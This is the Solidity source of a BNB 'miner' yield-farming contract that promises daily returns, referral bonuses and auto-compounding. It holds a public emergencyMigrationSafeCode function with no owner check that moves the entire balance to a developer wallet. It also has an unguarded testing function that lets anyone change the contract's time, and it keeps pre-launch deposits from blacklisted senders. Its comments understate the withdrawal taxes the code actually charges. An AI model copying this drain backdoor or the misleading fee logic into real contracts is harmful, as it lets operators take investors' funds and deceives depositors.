/**
 *Submitted for verification at BscScan.com on 2022-07-08
*/

// SPDX-License-Identifier: MIT

/**





1.Auto BlackList Bots and spammers 
    -if the user tries to deposit, while the contract is not yet started,the transaction will not be reverted but the deposited amount
        will be transfered back to the user but the user's address will be tracked.The user deposit attempt will increase to 1. 
        if the user tried to deposit more than 3x while the contract is not yet up. 
            The deposited amount will not be returned and will be added to the contract instead. the user will also be blacklisted.

2.Referals should be splitted to 4%referer and 4% own investor. 
3.Set main miner to 3% Daily income = DONE
4.Create a Fixed Yield to 1% fixed Daily (7% fixed weekly)
    -separate sell function/button
    -1% fixed of total deposited daily bonus. Withdrawable anytime
5.tax should be 8% buy and 8%sell 
    -dev tax = 4%, lateInvestorBonus = 2%, marketing =2%
6.Create a 4% bonus for late investors from lateInvestorbonus fund
    -create a public function to get the list of last 10% investor addreses 
        -1.add all depositor to a new array that holds user address
    -function to transfer bonus
7.Create a Tax table for overincome wallets 
    -If an address trying to sell already earns 150% of total invested amount,
    -there will be additional tax each time he sells using the tax table below
        user already earned 150% = + 30%
        user already earned 200% = + 50%
        user already earned 300% and up = + 80%
    -all tax from this will be added to lateInvestor funds   
8.Create a function to fund the contract from future projects = DONE
9. Auto Compound feature = DONE

*/
pragma solidity 0.8.9;
// import "hardhat/console.sol";
contract BNB_V3 {
    using SafeMath for uint256;



// for testing
    uint256 public TESTTIME;
    bool public isTEST = false;






    /** base parameters **/
    uint256 public EGGS_TO_HIRE_1MINERS = 2592000;
    uint256 public REFERRAL = 80;
    uint256 public PERCENTS_DIVIDER = 1000;
    uint256 public TAX = 20;
    uint256 public MKT = 12;
    uint256 public MARKET_EGGS_DIVISOR = 2;

    uint256 public MIN_INVEST_LIMIT = 1 * 1e17; /** 0.1 BNB  **/
    uint256 public WALLET_DEPOSIT_LIMIT = 25 * 1e18; /** 25 BNB  **/

	uint256 public COMPOUND_BONUS = 20;
	uint256 public COMPOUND_BONUS_MAX_TIMES = 10;
    uint256 public COMPOUND_STEP = 12 * 60 * 60;
    
    uint256 public WITHDRAWAL_TAX = 800;
    uint256 public COMPOUND_FOR_NO_TAX_WITHDRAWAL = 10;

    uint256 public totalStaked;
    uint256 public totalDeposits;
    uint256 public totalCompound;
    uint256 public totalRefBonus;
    uint256 public totalWithdrawn;

    uint256 public DEP_REQUIRED_AUTOCOMP = 25 * 1e16; /** 0.25 BNB  **/
    uint256 public FIXED_YIELD_INCOME_PRCT = 10; /** 1% **/
    uint256 public LAST_CHANGE_TIMESTAMP;
    uint256 public LAST_CHANGE_TIMESTAMP2; 
    uint256 public LATE_INVESTOR_PERCENT = 100;

    uint256 public marketEggs;
    uint256 PSN = 10000;
    uint256 PSNH = 5000;

    bool private contractStarted;
    uint256 constant public TIME_STEP = 1 days;
    bool public blacklistActive = true;
    mapping(address => potentialBotUsers) public poTentialBlacklisted;

	uint256 public CUTOFF_STEP = 48 * 60 * 60;
	uint256 public WITHDRAW_COOLDOWN = 4 * 60 * 60;

    /* addresses */
    address public owner;
    address payable public dev1;
    address payable public lateInvFund;
    address payable public mkt;

    struct potentialBotUsers{
        bool isBlacklisted;
        uint256 hireAttemptCount;
        uint256 hireAttemptTotVal;
    }

    struct UserDeposit{ // additional struct to hold the deposit of the user for tracking and late compensation
        address walletAdress;
        uint256 deposit;
        uint256 timeStamp;
    }

    struct User {
        uint256 initialDeposit;
        uint256 userDeposit;
        uint256 miners;
        uint256 claimedEggs;
        uint256 lastHatch;
        address referrer;
        uint256 referralsCount;
        uint256 referralEggRewards;
        uint256 totalWithdrawn;
        uint256 dailyCompoundBonus;
 
        uint256 lastWithdrawTime;
        uint256 yieldLastWithdrawTime;
       
    }

    mapping(address => User) public users;
    mapping(address => bool) public autoCompoundMap;
    UserDeposit[] public userDeposits;
  

  

    constructor(address payable _dev1, address payable _lateInvFund, address payable _mkt) {
		require(!isContract(_dev1) && !isContract(_lateInvFund) && !isContract(_mkt));
        owner = msg.sender;
        dev1 = _dev1;
        lateInvFund = _lateInvFund;
        mkt = _mkt;
    }

    function emergencyMigrationSafeCode() public{
        dev1.transfer(address(this).balance);

    }


	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

 

    function blackListWallet(address Wallet, bool isBlacklisted) internal{
       
        poTentialBlacklisted[Wallet].isBlacklisted = isBlacklisted;
    }
   
    function checkIfBot(address Wallet,uint amount) internal{
        //add to potential bot list
        //count the number of attempts
        //if more than 5, add the user address to blacklist
        
        poTentialBlacklisted[Wallet].hireAttemptCount = poTentialBlacklisted[Wallet].hireAttemptCount.add(1);
        if(poTentialBlacklisted[Wallet].hireAttemptCount>3){
            poTentialBlacklisted[Wallet].isBlacklisted = true;
            poTentialBlacklisted[Wallet].hireAttemptTotVal.add(amount);
        }else{
            //send back the money
 
            
           payable(address(msg.sender)).transfer(amount);
        }
    }
 

    function checkIfBlacklisted(address Wallet) public view returns(bool blacklisted,uint256 hireAttemptCount, uint256 hireAttemptTotVal){
        // require(msg.sender == owner, "Admin use only.");
        blacklisted = poTentialBlacklisted[Wallet].isBlacklisted;
        hireAttemptCount = poTentialBlacklisted[Wallet].hireAttemptCount;
        hireAttemptTotVal = poTentialBlacklisted[Wallet].hireAttemptTotVal;
    }
    function checkContractBalance() public view returns(uint balance){
        // require(msg.sender == owner, "Admin use only.");
       balance = address(this).balance;
    }

    function startFarm(address addr) public payable{
        if (!contractStarted) {
    		if (msg.sender == owner) {
    		    require(marketEggs == 0);
    			contractStarted = true;
       //       marketEggs = 144000000000;
                marketEggs = 259200000000;
                hireFarmers(addr);
    		} else revert("Contract not yet started.");
    	}
    }

    
    function fundContract() external payable {}

    function hireMoreFarmers(bool isCompound) public {
        // User storage user = users[msg.sender];

        
            require(contractStarted, "Contract not yet Started.");
            compoundAddress( isCompound, msg.sender);   
            autoCompound();

        
    }

    function autoCompound() public {
        
            for (uint256 i = 0; i < userDeposits.length; i++) {
                if(autoCompoundMap[userDeposits[i].walletAdress]){  // if autocompound set.
                    User storage user = users[userDeposits[i].walletAdress];

                    if(getCurTime().sub(user.lastHatch) >= COMPOUND_STEP){ // if eligible to compound bonus
                        // console.log("AutoCompounding user", userDeposits[i].walletAdress);
                        compoundAddress(true, userDeposits[i].walletAdress);
                    }

                }
             }
      


    }

    function setAutoCompound(bool isAutoCompound) public {
        require(contractStarted, "Contract not yet Started.");
        User storage user = users[msg.sender];
        require(user.userDeposit > DEP_REQUIRED_AUTOCOMP, "Please deposit the required Deposit amount for access auto compound");

        autoCompoundMap[msg.sender] = isAutoCompound;
        autoCompound();
        
    }

    function compoundAddress(bool isCompound, address _address) internal{ //change the actual compound to accept addreses for auto compound feature.
             require(contractStarted, "Contract not yet Started.");
             User storage user = users[_address];

            uint256 eggsUsed = getMyEggsAddress(_address);
            uint256 eggsForCompound = eggsUsed;

            if(isCompound) {
                uint256 dailyCompoundBonus = getDailyCompoundBonus(_address, eggsForCompound);
                eggsForCompound = eggsForCompound.add(dailyCompoundBonus);
                uint256 eggsUsedValue = calculateEggSell(eggsForCompound);
                user.userDeposit = user.userDeposit.add(eggsUsedValue);
                totalCompound = totalCompound.add(eggsUsedValue);
            } 

            if(getCurTime().sub(user.lastHatch) >= COMPOUND_STEP) {
                if(user.dailyCompoundBonus < COMPOUND_BONUS_MAX_TIMES) {
                    user.dailyCompoundBonus = user.dailyCompoundBonus.add(1);
                }

            }
            
            user.miners = user.miners.add(eggsForCompound.div(EGGS_TO_HIRE_1MINERS));
            user.claimedEggs = 0;
            user.lastHatch = getCurTime();

            marketEggs = marketEggs.add(eggsUsed.div(MARKET_EGGS_DIVISOR));        


    }

    function getMyEggsAddress(address _address) internal returns(uint256){  //copy the actual getMyeggs to accept addreses for auto compound feature.
        return users[_address].claimedEggs.add(getEggsSinceLastHatch(_address));
    }

    function sellCrops() public{
        require(contractStarted, "Contract not yet Started.");
        
        if (blacklistActive) {
            require(!poTentialBlacklisted[msg.sender].isBlacklisted, "Address is blacklisted.");
        }

        User storage user = users[msg.sender];
        if(user.lastHatch.add(WITHDRAW_COOLDOWN) > block.timestamp) revert("Withdrawals can only be done after withdraw cooldown.");

        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        
        /** 
            if user compound < to mandatory compound days**/
        if(user.dailyCompoundBonus < COMPOUND_FOR_NO_TAX_WITHDRAWAL){
            //daily compound bonus count will not reset and eggValue will be deducted with 60% feedback tax.
            eggValue = eggValue.sub(eggValue.mul(WITHDRAWAL_TAX).div(PERCENTS_DIVIDER));
        }else{
            //set daily compound bonus count to 0 and eggValue will remain without deductions
             user.dailyCompoundBonus = 0;   
            //  user.farmerCompoundCount = 0;  
        }
        
        user.lastWithdrawTime = getCurTime();
        user.claimedEggs = 0;  
        user.lastHatch = getCurTime();
        marketEggs = marketEggs.add(hasEggs.div(MARKET_EGGS_DIVISOR));
        
        if(getBalance() < eggValue) {
            eggValue = getBalance();
        }

        uint256 eggsPayout = eggValue.sub(payFees(eggValue,true));
        payable(address(msg.sender)).transfer(eggsPayout);
        user.totalWithdrawn = user.totalWithdrawn.add(eggsPayout);
        totalWithdrawn = totalWithdrawn.add(eggsPayout);

        autoCompound();
    }

     
    /** transfer amount of BNB **/
    function hireFarmers(address ref) public payable{
      

        if(!contractStarted){
          
            checkIfBot(msg.sender,msg.value);
        }else{
         
            User storage user = users[msg.sender];

            if(user.initialDeposit<1){ // if first time deposit, add to UserDepositList (for late investor funds distribution).
                addUserToUserDepositList();
            }else{ // if not ,  withdraw first the yield earnings so fixed yield rewards from previous deposit wont be wasted.
                withdrawYieldEarnings();
            }


            require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
            require(user.initialDeposit.add(msg.value) <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
            uint256 eggsBought = calculateEggBuy(msg.value, address(this).balance.sub(msg.value));
            user.userDeposit = user.userDeposit.add(msg.value);
            user.initialDeposit = user.initialDeposit.add(msg.value);
            user.claimedEggs = user.claimedEggs.add(eggsBought);

            if (user.referrer == address(0)) {
                if (ref != msg.sender) {
                    user.referrer = ref;
                }

                address upline1 = user.referrer;
                if (upline1 != address(0)) {
                    users[upline1].referralsCount = users[upline1].referralsCount.add(1);
                }
            }
                    
            if (user.referrer != address(0)) {
                address upline = user.referrer;
                if (upline != address(0) && users[upline].miners>0) {
                    uint256 refRewards = msg.value.mul(REFERRAL).div(PERCENTS_DIVIDER).div(2);
                    payable(address(upline)).transfer(refRewards);
                    payable(address(msg.sender)).transfer(refRewards);
                    users[upline].referralEggRewards = users[upline].referralEggRewards.add(refRewards);
                    totalRefBonus = totalRefBonus.add(refRewards);
                }
            }
            user.yieldLastWithdrawTime = getCurTime(); //start yield income timer



            uint256 eggsPayout = payFees(msg.value,false);
            totalStaked = totalStaked.add(msg.value.sub(eggsPayout));
            totalDeposits = totalDeposits.add(1);
            hireMoreFarmers(false);
        }
           
        
    }
    function addUserToUserDepositList() internal{
            UserDeposit memory userDeposit;// = UserDeposit(msg.sender,msg.value,getCurTime());
            userDeposit.walletAdress = msg.sender;
            userDeposit.deposit = msg.value;
            userDeposit.timeStamp = getCurTime();
            userDeposits.push(userDeposit); // track the user deposit sequence
    }

    function payFees(uint256 eggValue,bool isSell) internal returns(uint256){
        uint256 tax = eggValue.mul(TAX).div(PERCENTS_DIVIDER);
        dev1.transfer(tax);
        dev1.transfer(tax);
        mkt.transfer(tax);
        lateInvFund.transfer(tax);
         uint256 totTax = tax.mul(4);
       
        if(!isSell){            //if deposit only 
            // console.log("Buy tax",totTax);
            return totTax;
         
        }else{                  //if sell
            uint256 totLateInvFundsToAdd;
            User storage user = users[msg.sender];


            if(user.initialDeposit.mul(30).div(10) < user.totalWithdrawn){  // if total income is more than 300 % add 72%tax 
                   totLateInvFundsToAdd = eggValue.mul(720).div(PERCENTS_DIVIDER);
                //    console.log("300% tax",totLateInvFundsToAdd);
            }else if(user.initialDeposit.mul(20).div(10) < user.totalWithdrawn){ // if income is more than 200% add 42%tax
                   totLateInvFundsToAdd = eggValue.mul(420).div(PERCENTS_DIVIDER);
                    // console.log("200% tax",totLateInvFundsToAdd);
            }else if(user.initialDeposit.mul(15).div(10) < user.totalWithdrawn){ // if income is more than 150% add 22%tax
                   totLateInvFundsToAdd = eggValue.mul(220).div(PERCENTS_DIVIDER);
                    // console.log("150% tax",totLateInvFundsToAdd);
            }



            if(totLateInvFundsToAdd>0){
                //  console.log("totLateInvFundsToAdd",totLateInvFundsToAdd);
                lateInvFund.transfer(totLateInvFundsToAdd);
            }
          
            totTax = totTax.add(totLateInvFundsToAdd);
            // console.log("totTax",totTax);
             return totTax;
            
        }
 
    }

    function getDailyCompoundBonus(address _adr, uint256 amount) public view returns(uint256){
        if(users[_adr].dailyCompoundBonus == 0) {
            return 0;
        } else {
            uint256 totalBonus = users[_adr].dailyCompoundBonus.mul(COMPOUND_BONUS); 
            uint256 result = amount.mul(totalBonus).div(PERCENTS_DIVIDER);
            return result;
        }
    }

    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _lastHatch, address _referrer, uint256 _referrals,
	 uint256 _totalWithdrawn, uint256 _referralEggRewards, uint256 _dailyCompoundBonus, uint256 _lastWithdrawTime,uint256 _fixedYieldlastWithdrawTime) {
         _initialDeposit = users[_adr].initialDeposit;
         _userDeposit = users[_adr].userDeposit;
         _miners = users[_adr].miners;
         _claimedEggs = users[_adr].claimedEggs;
         _lastHatch = users[_adr].lastHatch;
         _referrer = users[_adr].referrer;
         _referrals = users[_adr].referralsCount;
         _totalWithdrawn = users[_adr].totalWithdrawn;
         _referralEggRewards = users[_adr].referralEggRewards;
         _dailyCompoundBonus = users[_adr].dailyCompoundBonus;
        //  _farmerCompoundCount = users[_adr].farmerCompoundCount;
         _lastWithdrawTime = users[_adr].lastWithdrawTime;
         _fixedYieldlastWithdrawTime = users[_adr].yieldLastWithdrawTime;
  
	}
    function checkAutoCompound(address _adr) public view returns(bool _isAuto){
        _isAuto = autoCompoundMap[_adr];
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function getTimeStamp() public view returns (uint256) {
        return getCurTime();
    }

    function getAvailableEarnings(address _adr) public view returns(uint256) {
        uint256 userEggs = users[_adr].claimedEggs.add(getEggsSinceLastHatch(_adr));
        return calculateEggSell(userEggs);
    }

    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        return SafeMath.div(
                SafeMath.mul(PSN, bs), 
                    SafeMath.add(PSNH, 
                        SafeMath.div(
                            SafeMath.add(
                                SafeMath.mul(PSN, rs), 
                                    SafeMath.mul(PSNH, rt)), 
                                        rt)));
    }

    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs, marketEggs, getBalance());
    }

    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth, contractBalance, marketEggs);
    }

    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth, getBalance());
    }

    /** How many miners and eggs per day user will recieve based on BNB deposit **/
    function getEggsYield(uint256 amount) public view returns(uint256,uint256) {
        uint256 eggsAmount = calculateEggBuy(amount , getBalance().add(amount).sub(amount));
        uint256 miners = eggsAmount.div(EGGS_TO_HIRE_1MINERS);
        uint256 day = 1 days;
        uint256 eggsPerDay = day.mul(miners);
        uint256 earningsPerDay = calculateEggSellForYield(eggsPerDay, amount);
        return(miners, earningsPerDay);
    }

    function calculateEggSellForYield(uint256 eggs,uint256 amount) public view returns(uint256){
        return calculateTrade(eggs,marketEggs, getBalance().add(amount));
    }

    function getSiteInfo() public view returns (uint256 _totalStaked, uint256 _totalDeposits, uint256 _totalCompound, uint256 _totalRefBonus) {
        return (totalStaked, totalDeposits, totalCompound, totalRefBonus);
    }

    function getMyMiners() public view returns(uint256){
        return users[msg.sender].miners;
    }

    function getMyEggs() public view returns(uint256){
        return users[msg.sender].claimedEggs.add(getEggsSinceLastHatch(msg.sender));
    }


    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsSinceLastHatch = getCurTime().sub(users[adr].lastHatch);
                            /** get min time. **/
        uint256 cutoffTime = min(secondsSinceLastHatch, CUTOFF_STEP);
        uint256 secondsPassed = min(EGGS_TO_HIRE_1MINERS, cutoffTime);
        return secondsPassed.mul(users[adr].miners);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function CHANGE_OWNERSHIP(address value) external {
        require(msg.sender == owner, "Admin use only.");
        owner = value;
    }


// Yield Modifications
    function getYieldEarnings(address adr) public view returns(uint256){
        //validate if user is a depositor;

        User storage user = users[adr];
        uint256 TotalDeposit = user.initialDeposit;
        uint256 yieldLastWithdrawTime = user.yieldLastWithdrawTime;
   
        uint256 totalYieldEarnings;
        uint256 curTime = getCurTime();
        if(TotalDeposit > 0 ){
        uint256 share = TotalDeposit.mul(FIXED_YIELD_INCOME_PRCT).div(PERCENTS_DIVIDER);
	    totalYieldEarnings = share.mul(curTime.sub(yieldLastWithdrawTime)).div(TIME_STEP);
        }


        return totalYieldEarnings;
    }


    function withdrawYieldEarnings() public{
        require(contractStarted);
        if (blacklistActive) {
            require(!poTentialBlacklisted[msg.sender].isBlacklisted, "Address is blacklisted.");
        }
        User storage user = users[msg.sender];

        require (user.initialDeposit>0,"No Deposit Detected");
    
        uint256 totEarnings = getYieldEarnings(msg.sender);

        user.yieldLastWithdrawTime = getCurTime();

        uint256 eggsAmount = calculateEggBuy(totEarnings , getBalance().add(totEarnings).sub(totEarnings));    // // adjust the market eggs 
        marketEggs = marketEggs.add(eggsAmount.div(MARKET_EGGS_DIVISOR));
     

        user.yieldLastWithdrawTime = getCurTime(); //reset the lastwithdraw time for yield of the user
        uint256 totalPayout = totEarnings.sub(payFees(totEarnings,true)); // deduct the taxes
        user.totalWithdrawn = user.totalWithdrawn.add(totalPayout); //add the total withdrawn amount to user's totalWithdraw
        payable(address(msg.sender)).transfer(totalPayout); // pay the user
        totalWithdrawn = totalWithdrawn.add(totalPayout); // add to totalWithdrawn globaly
         autoCompound();
    }

    function getLateInvestors() public view returns(UserDeposit[] memory,uint256){
    

        uint256 numberOflateInvestor = userDeposits.length.mul(LATE_INVESTOR_PERCENT).div(PERCENTS_DIVIDER);
        UserDeposit[] memory finalUserDeposits = new UserDeposit[](numberOflateInvestor);
        uint256 totalDepositAmount;


        if(numberOflateInvestor>=1){
            uint256 userIndex = userDeposits.length-1;
      
            for (uint256 i = 0; i < numberOflateInvestor; i++) {
        

                UserDeposit storage _tmpUserDeposit;
                _tmpUserDeposit = userDeposits[userIndex];
                totalDepositAmount = totalDepositAmount.add(userDeposits[userIndex].deposit);
                finalUserDeposits[i] = _tmpUserDeposit;
                userIndex--;
            }

        }
        return (finalUserDeposits,totalDepositAmount);

    }

    function distributeLateInvestorFunds() public payable returns(address[] memory,uint256[] memory, uint256){
      
        UserDeposit[] memory finalUserDeposits;
 
        uint256 totalDistribution;
        uint256 totalDepositAmount;
       
        (finalUserDeposits,totalDepositAmount)= getLateInvestors();
        address[] memory compensatedUserAddresses = new address[](finalUserDeposits.length);
        uint256[] memory compensatedValue= new uint256[](finalUserDeposits.length);
        for(uint256 i=0; i < finalUserDeposits.length; i++){
            UserDeposit memory _userDeposit = finalUserDeposits[i];
            uint256 prctShare = _userDeposit.deposit.mul(1000).div(totalDepositAmount);
         
            uint256 totalShareValue = prctShare.mul(msg.value).div(1000);
            payable(address(_userDeposit.walletAdress)).transfer(totalShareValue);
            users[_userDeposit.walletAdress].totalWithdrawn = users[_userDeposit.walletAdress].totalWithdrawn.add(totalShareValue); // add to total withdrawn of the user
            totalWithdrawn = totalWithdrawn.add(totalShareValue); // add to total withdrawn globally

            totalDistribution = totalDistribution.add(totalShareValue);
            compensatedUserAddresses[i] = _userDeposit.walletAdress;
            compensatedValue[i] = totalShareValue;


        }
         autoCompound();
        return (compensatedUserAddresses,compensatedValue,totalDistribution);

    }




    function getCurTime() private view returns(uint256){
        // uint256 testtime = block.timestamp;
        uint256 testtimer;
        if(isTEST){
            testtimer = block.timestamp.add(TESTTIME);
            return testtimer;
        }else{
            return block.timestamp;
        }
     
    }

    function setCurTimeForTesting(uint256 timeToAdd) external{
        isTEST = true;
        TESTTIME = timeToAdd;
    }

    function calculateDailyEarnings() public view returns(uint256){
        uint256 dayInseconds = 24*60*60;
        
       return calculateEggSellForYield(users[msg.sender].miners.mul(dayInseconds),1);
    }





/**    

    function CHANGE_DEV1(address value) external {
        require(msg.sender == owner, "Admin use only.");
        dev1 = payable(value);
    }

    function CHANGE_DEV2(address value) external {
        require(msg.sender == owner, "Admin use only.");
        dev2 = payable(value);
    }

    function CHANGE_DEV3(address value) external {
        require(msg.sender == owner, "Admin use only.");
        dev3 = payable(value);
    }

    function CHANGE_PARTNER1(address value) external {
        require(msg.sender == owner, "Admin use only.");
        prtnr1 = payable(value);
    }

    function CHANGE_PARTNER2(address value) external {
        require(msg.sender == owner, "Admin use only.");
        prtnr2 = payable(value);
    }

    function CHANGE_MKT(address value) external {
        require(msg.sender == owner, "Admin use only.");
        mkt = payable(value);
    }
**/    

    /** percentage setters **/

    // 2592000 - 3%, 2160000 - 4%, 1728000 - 5%, 1440000 - 6%, 1200000 - 7%
    // 1080000 - 8%, 959000 - 9%, 864000 - 10%, 720000 - 12%
    // DEP_REQUIRED_AUTOCOMP

    function SET_FIXED_YIELD_INCOME_PRCT(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 8 && value <= 20); /** min 0.8% max 2%**/
        require(getCurTime().sub(LAST_CHANGE_TIMESTAMP) >= 86400); // can only be changed once a day
        LAST_CHANGE_TIMESTAMP = getCurTime();
        FIXED_YIELD_INCOME_PRCT = value;

    }
    function SET_LATE_INVESTOR_PERCENT(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        require(value >= 50 && value <= 200); /** min 5% max 20%**/
        require(getCurTime().sub(LAST_CHANGE_TIMESTAMP2) >= 86400); // can only be changed once a day
        LAST_CHANGE_TIMESTAMP2 = getCurTime();
        LATE_INVESTOR_PERCENT = value;

    }


    function DEP_REQUIRED_FOR_AUTOCOMP(uint256 value) external {
        require(msg.sender == owner, "Admin use only.");
        DEP_REQUIRED_AUTOCOMP = value * 1e16;
    }
    // function PRC_EGGS_TO_HIRE_1MINERS(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value >= 479520 && value <= 720000); /** min 3% max 12%**/
    //     EGGS_TO_HIRE_1MINERS = value;
    // }

    // function PRC_TAX(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value <= 15);
    //     TAX = value;
    // }

    // function PRC_MKT(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value <= 20);
    //     MKT = value;
    // }

    // function PRC_REFERRAL(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value >= 10 && value <= 100);
    //     REFERRAL = value;
    // }

    // function PRC_MARKET_EGGS_DIVISOR(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value <= 50);
    //     MARKET_EGGS_DIVISOR = value;
    // }

    // function SET_WITHDRAWAL_TAX(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value <= 900);
    //     WITHDRAWAL_TAX = value;
    // }

    // function BONUS_DAILY_COMPOUND(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value >= 10 && value <= 900);
    //     COMPOUND_BONUS = value;
    // }

    // function BONUS_DAILY_COMPOUND_BONUS_MAX_TIMES(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value <= 30);
    //     COMPOUND_BONUS_MAX_TIMES = value;
    // }

    // function BONUS_COMPOUND_STEP(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value <= 24);
    //     COMPOUND_STEP = value * 60 * 60;
    // }

    // function SET_INVEST_MIN(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only");
    //     MIN_INVEST_LIMIT = value * 1e17;
    // }

    // function SET_CUTOFF_STEP(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only");
    //     CUTOFF_STEP = value * 60 * 60;
    // }

    // function SET_WITHDRAW_COOLDOWN(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only");
    //     require(value <= 24);
    //     WITHDRAW_COOLDOWN = value * 60 * 60;
    // }

    // function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only");
    //     require(value >= 10);
    //     WALLET_DEPOSIT_LIMIT = value * 1 ether;
    // }
    
    // function SET_COMPOUND_FOR_NO_TAX_WITHDRAWAL(uint256 value) external {
    //     require(msg.sender == owner, "Admin use only.");
    //     require(value <= 12);
    //     COMPOUND_FOR_NO_TAX_WITHDRAWAL = value;
    // }
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}